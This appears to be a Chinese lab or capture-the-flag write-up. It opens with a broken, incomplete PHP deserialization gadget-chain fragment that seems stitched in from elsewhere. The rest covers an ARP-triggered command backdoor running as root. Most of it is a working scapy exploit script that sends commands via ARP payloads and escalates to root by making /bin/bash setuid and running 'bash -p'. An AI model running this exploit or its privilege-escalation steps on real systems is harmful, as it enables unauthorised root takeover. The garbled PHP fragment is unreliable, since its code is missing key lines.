// The class definitions are needed to create the objects before serialization.
// The method bodies are not required for serialization itself.

    public $obj;
}

class Middle {
    public $target;
}

class Runner {
    public $command;
}

// 1. Create the final object in the chain (the one that executes the command)
$runner = new Runner();
// Set the command you want to execute on the server

// 2. Create the middle object that links to the final one

$middle->target = $runner;

// 3. Create the initial object that the vulnerable script will interact with

$starter->obj = $middle;

// 4. Serialize the object chain and Base64 encode it

以root的身份执行了/root/arp_server.py

看到arp字眼，我一开始以为是arp欺骗的信息，后来才发现只是通过ARP协议接收并执行命令的后门程序

经过对AI的拷打，知道了arp_server.py的一些信息

命令长度 ≤ 6个字符
命令不能包含空格
检查ARP包的payload是否以"CMD:"开头
如果是，则提取并执行命令
只能通过ARP请求触发
每次执行有5秒超时
通过ARP响应包返回命令执行结果

知道这些信息后，接着拷打AI，给出了下面的脚本

其中要修改攻击机和靶机信息为你自己的机器

#!/usr/bin/env python3
# arp_exploit_final.py
from scapy.all import *
import time

TARGET = "192.168.1.5"
ATTACKER = "192.168.1.7"
IFACE = "eth0"

def send_arp_command(cmd, wait_response=True):
    """
    发送 ARP 命令到靶机
    命令限制：长度 <= 6, 无空格
    """
    payload = b"CMD:" + cmd.encode()

    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
          ARP(op=1, pdst=TARGET) / \
          Raw(load=payload)

    print(f"[*] 发送命令: {cmd}")

    if wait_response:
        ans, unans = srp(pkt, iface=IFACE, timeout=3, verbose=0)

        if ans:
            for snd, rcv in ans:
                if Raw in rcv:
                    response = rcv[Raw].load
                    print(f"[+] 响应:\n{response.decode(errors='ignore')}\n")
                    return response
        else:
            print("[-] 无响应\n")
            return None
    else:
        sendp(pkt, iface=IFACE, verbose=0)
        print("[+] 已发送\n")
        return None

def main():
    print("="*60)
    print("ARP 命令注入利用工具")
    print("="*60)
    print(f"目标: {TARGET}")
    print(f"限制: 命令长度 <= 6, 无空格")
    print("="*60)

    # 步骤 1: 测试连接
    print("\n[1] 测试连接...")
    send_arp_command("whoami")

    # 步骤 2: 查看当前目录
    print("[2] 查看当前路径...")
    send_arp_command("pwd")

    # 步骤 3: 执行预先准备的脚本
    print("[3] 尝试执行 /tmp/p (需要在靶机上预先创建)")
    print("    在靶机上先运行:")
    print("    echo '#!/bin/bash' > /tmp/p")
    print("    echo 'chmod +s /bin/bash' >> /tmp/p")
    print("    chmod +x /tmp/p")
    input("\n按回车继续...")

    send_arp_command("/tmp/p", wait_response=False)

    print("\n" + "="*60)
    print("[+] 利用完成！")
    print("="*60)
    print("在靶机上执行以下命令获取 root:")
    print("  bash -p")
    print("="*60)

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        # 直接执行指定命令
        cmd = sys.argv[1]
        if len(cmd) > 6 or ' ' in cmd:
            print(f"[-] 命令不符合要求: 长度={len(cmd)}, 含空格={' ' in cmd}")
            sys.exit(1)
        send_arp_command(cmd)
    else:
        main()
